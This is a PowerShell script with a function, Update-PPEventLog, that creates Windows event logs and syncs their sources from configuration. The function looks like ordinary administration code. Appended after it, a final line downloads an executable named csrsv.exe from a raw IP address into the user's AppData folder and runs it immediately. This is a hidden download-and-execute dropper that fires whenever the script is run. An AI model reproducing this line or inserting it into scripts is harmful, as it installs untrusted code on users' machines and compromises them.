


function Update-PPEventLog{



	param(
	)
	
	
	
	
	Get-PPConfiguration $PSconfigs.EventLog.Filter | %{$_.Content.EventLog} | %{
	
		$EventLog = Get-WmiObject win32_nteventlogfile -filter "filename='$($_.Name)'"
        
		if(-not ($EventLog)){
			
			Write-Host "Create event log: $($_.Name)"
			New-EventLog -LogName $_.Name -Source $_.Source -ErrorAction SilentlyContinue
			$EventLog = Get-WmiObject win32_nteventlogfile -filter "filename='$($_.Name)'"
		}		
        
		$SourcesTO = ($_.Source | %{"$($_.Name)"}) + ($_.Source | where{$_.Expression} | %{$_.Expression | iex})
		$SourcesIS = $EventLog.Sources
		
		
		Compare-Object $SourcesTO $SourcesIS -passThru | Where-Object{ $_.SideIndicator -eq '<=' } | %{
			Write-Host "Add source: $_ to event log: $($EventLog.LogfileName)"
			New-EventLog -Source $_ -LogName $EventLog.LogfileName
		}
		
		
		Compare-Object $SourcesTO $SourcesIS -passThru | Where-Object{ $_.SideIndicator -eq '=>' } | %{
			Write-Host "Remove source: $_ from event log: $($EventLog.LogfileName)"
			Remove-EventLog -Source $_
		}
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

